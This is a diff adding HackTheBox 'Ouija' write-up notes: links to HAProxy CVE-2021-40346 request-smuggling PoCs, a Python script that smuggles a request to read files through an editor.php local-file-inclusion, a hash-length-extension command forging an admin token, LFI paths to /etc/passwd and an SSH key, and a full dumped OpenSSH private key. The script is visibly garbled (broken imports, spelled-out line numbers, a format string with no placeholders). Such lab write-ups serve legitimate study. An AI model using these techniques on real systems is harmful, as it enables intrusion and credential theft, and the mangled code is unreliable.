@@ -115,6 +115,10 @@
 
 ## Ouija
 
+{% embed url="https://darkwing.moe/2023/12/05/Ouija-HackTheBox/" %}
+
+$y$j9T$Kg/bsxGg3rtmr7d.HkQ0N/$14XejevAukcx9oDmYsXF967olH7um9buAQ3wSGdOCy8
+
 ### Reco
 
 #### nmap
@@ -206,6 +210,165 @@
 
 <figure><img src=".gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>
 
-* [Smuggling](https://portswigger.net/web-security/request-smuggling#what-is-http-request-smuggling)
-* [Smuggling2](https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/)
-*
+* PoCs
+  * alexOarga/CVE-2021-40346: CVE-2021-40346 - HaProxy HTTP request smuggling through integer overflow\
+    [https://github.com/alexOarga/CVE-2021-40346](https://github.com/alexOarga/CVE-2021-40346)
+  * HAProxy vulnerability enables HTTP request smuggling attacks | The Daily Swig\
+    [https://portswigger.net/daily-swig/haproxy-vulnerability-enables-http-request-smuggling-attacks](https://portswigger.net/daily-swig/haproxy-vulnerability-enables-http-request-smuggling-attacks)
+  * Critical vulnerability in HAProxy | JFrog Security Research Team\
+    [https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/](https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/)
+  * Client-Side Desync - PortSwigger - YouTube\
+    [https://www.youtube.com/watch?v=6wVb6KSmras\&ab\_channel=Txhaka](https://www.youtube.com/watch?v=6wVb6KSmras\&ab\_channel=Txhaka)
+
+### Exploitation
+
+#### Content
+
+<figure><img src=".gitbook/assets/image (73).png" alt=""><figcaption></figcaption></figure>
+
+* init.sh
+  * beginning of api config... (Front Jailor 3000 End)
+    *
+
+        <figure><img src=".gitbook/assets/image (74).png" alt=""><figcaption></figcaption></figure>
+
+
+* app.js
+  * sub-base 64+16 ... identification header, sha256, ihash header...
+    *
+
+        <figure><img src=".gitbook/assets/image (75).png" alt=""><figcaption></figcaption></figure>
+
+
+
+#### LFI 1
+
+<figure><img src=".gitbook/assets/image (76).png" alt=""><figcaption></figcaption></figure>
+
+* crafted python script for that...
+  * lfi.py
+
+| <pre><code>1
+2
+Three
+Four
+Five
+6
+7
+8
+9
+Ten
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+twenty one
+twenty two
+twenty three
+</code></pre> | <pre><code>from pwn import *
+import socket
+import sy
+import re
+import gzip 
+
+if len (sys.argv) &#x3C; 2:
+	print ("missing file param")
+	sys.exit ()file = sys.argv[1]
+	
+
+
+cl = len ("GET http://dev.ouija.htb/editor.php?file=%s HTTP/1.1\r\nh:" % file)
+
+payload = """POST / HTTP/1.1\r\nHost: ouija.htb\r\nContent-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n\r\n""" % (cl, file)
+
+r = remote ('ouija.htb', 80)
+r.send (bytes (payload, 'utf-8'))
+
+response = r.recvrepeat (1).decode ('utf-8')
+
+output = re.search (r'(?&#x3C;=\&#x3C;textarea name="content" id="content" cols="30" rows="10"\>) ([\s\S]*?) (?=\&#x3C;/textarea\>)', Response).group ()
+print (output)
+</code></pre> |
+| ------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+
+* output
+  *
+
+      <figure><img src=".gitbook/assets/image (77).png" alt=""><figcaption></figcaption></figure>
+
+
+
+#### extend the hash
+
+* hash\_extender tool
+  * `./hash_extender -d'bot1: bot' -s 4b22a0418847a51650623a458acc1bba5c01f6521ea6135872b9f15b56b988c1 -a': admin:True' -f sha2`
+  * output:
+    * New string
+      * `626f74313a626f74800000000000000000000000000000000000000000000000000000000000000003a3a61646d69`
+    * New signature
+      * ```
+        14be2f4a24f876a07a5570cc2567e18671b15e005ed92f10089533c1830c0b
+        ```
+    * Type: sha256
+    * Secret length: 23
+
+#### LFI 2
+
+<figure><img src=".gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>
+
+* .config/bin/process\_informations/self/root/etc/passwd&#x20;
+* .config/bin/process\_informations/self/root/home/leila/.ssh/id\_rsa
+
+<figure><img src=".gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>
+
+* **obtained ir\_rsa of user leila**
+  * path of injection: ......./home/leila/.ssh/id\_rsa
+    *
+
+        ```
+        -----BEGIN OPENSSH PRIVATE KEY-----
+        b3BlbnNzaC1rZXktdjEAAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+        NhAAAAAwEAAQAAAYEAqdhNH4Q8tqf8bXamRpLkKKsPSgaVR1CzNR/P2WtdVz0Fsm5bAusP
+        O4ef498wXZ4l17LQ0ZCwzVj7nPEp9Ls3AdTFZP7aZXUgwpWF7UV7MXP3oNJ0fj26ISyhdJ
+        ZCTE/7Wie7lkk6iEtIa8O5eW2zrYDBZPHG0CWFk02NVWoGjoqpL0/kZ1tVtXhdVyd3Q0Tp
+        miaGjCSJV6u1jMo/uucsixAb + vYUrwlWaYsvgW6kmr26YXGTShXRbqHBHtcDRv6EuarG5
+        7SqKTvVD0hzSgMb7Ea4JABopTyLtQSioWsEzwz9CCkJZOvkU01tY/Vd1UJvDKB8TOU2PAi
+        aDKaZNpDNhgHcUSFH4/1AIi5UaOrX8NyNYBirwmDhGovN/J1fhvinXts9FlzHKZINcJ99b
+        KkPln3e5EwJnWKrnTDzL9ykPt2IyVrYz9QmZuEXu7zdgGPxOd+HoE3l+Px9/pp32kanWwT
+        yuv06aVlpYqm9PrHsfGdyfsZ5OMG3htVo4/OXFrBAAAFgE/tOjBP7TowAAAAB3NzaC1yc2
+        EAAAGBAKnYTR+ EPLan/G12pkaS5CirD0oGlUdQszUfz9lrXVc9BbJuWwLrDzuHn+PfMF2e
+        Jdey0NGQsM1Y+5zxKfS7NwHUxWT+2mV1IMKVhe1FezFz96DSdH49uiEsoXSWQkxP+1onu5
+        ZJOohLSGvDuXlts62AwWTxxtAlhZNNjVqBo6KqS9P5GdbVbV4XVcnd0NE6ZomhowkiVer
+        tYzKP7rnLIsQG/r2FK8JVmmLL4FupJq9umFxmU0oV0W6hwR7XA0b+hLmqxue0qik71Q9Ic
+        0oDG + xGuCQAaKU8i7UEoqFrBM8M/QgpCWTr5FNNbWP1XdVCbwygfEzlNjwImgymmTaQzYY
+        B3FEhR+ P9QCIuVGjq1/DcjWAYq8Jg4RqLzfydX4b4p17bPRZcxymSDXCffWypD5Z93uRMC
+        Z1iq50w8y/cpD7diMla2M/UJmbhF7u83YBj8Tnfh6BN5fj8ff6ad9pGp1sE8rr9OmlZaWK
+        pvT6x7Hxncn7GeTjBt4bVaOPzlxawQAAAAMBAAEAAAGAEJ9YvPLmNkIulE/+af3KUqibMH
+        WAeqBNSa+5WeAGHJmeSx49zgVPUlYtsdGQHDl0Hq4jfb8Zbp980JlRr9/6vDUktIO0wCU8
+        dY7IsrYQHoDpBVZTjF9iLgj +LDjgeDODuAkXdNfp4Jtl45qQpYX9a0aQFThlG9xvLaGD
+        fuOFkdwcGh6vOnacFD8VmtdGn0KuAGXwTcZDYr6IGKxzIEy/9hnagj0hWp3V5/4b0AYxya
+        dxr1E/YUxIBC4o9oLOhF4lpm0FvBJQxLOG+lyEv6HYesX4txDBY7ep6H1Rz6R+fgVJPFx
+        1LaYaNWAr7X4jlZfBhO5WIeuHW+yqba6j4z3qQGHaxj8c1+wOAANVMQcdHCTUvkKafh3oz
+        4Cn58ZeMWq6vwk0vPdRknBn3lKwOYGrq2lp3DI2jslCh4aaehZ1Bf+/UuP6Fc4kbiCuNAR
+        dM7lG35geafrfJPo9xfngr44I8XmhBCLgoFO4NfpBSjnKtNa2bY3Q3cQwKlzLpPvyBAAAA
+        wErOledf + GklKdq8wBut0gNszHgny8rOb7mCIDkMHb3bboEQ6Wpi5M2rOTWnEO27oLyFi1
+        hCAc+URcrZfU776hmswlYNDuchBWzNT2ruVuZvKHGP3K3/ezrPbnBaXhsqkadm2el5XauC
+        MeaZmw/LK+0Prx/AkIys99Fh9nxxHcsuLxElgXjV+qKdukbT5/YZV/axD4KdUq0f8jWALy
+        rym4F8nkKwVobEKdHoEmK/Z97Xf626zN7pOYx0gyA7jDh1WwAAAMEAw9wL4j0qE4OR5Vbl
+        jlvlotvaeNFFUxhy86xctEWqi3kYVuZc7nSEz1DqrIRIvh1Anxsm/4qr4+P9AZZhntFKCe
+        DWc8INjuYNQV0zIj/t1mblQUpEKWCRvS0vlaRlZvX7ZjCWF/84RBr/0Lt3t4wQp44q1eR0
+        nRMaqbOcnSmGhvwWaMEL73CDIvzbPK7pf2OxsrCRle4BvnEsHAG/qlkOtVSSerio7Jm7c0
+        L45zK + AcLkg48rg6Mk52AzzDetpNd5AAAAwQDd/1HsP1iVjGut2El2IBYhcmG1OH+1VsZY
+        UKjA1Xgq8Z74E4vjXptwPumf5u7jWt8cs3JqAYN7ilsA2WymP7b6v7Wy69XmXYWh5RPco3
+        ozaH3tatpblZ6YoYZI6Aqt9V8awM24ogLZCaD7J+zVMd6vkfSCVt1DHFdGlywLPr7tqx0b
+        KsrdSY5mJ0d004Jk7FW+nIhxSTD3nHF4UmLtO7Ja9KBW9e7z+k+NHazAhIpqchwqIX3Io6
+        DvfM2TbsfLo4kAAAALbGVpbGFAb3VpamE=
+        -----END OPENSSH PRIVATE KEY-----
+        ```
+
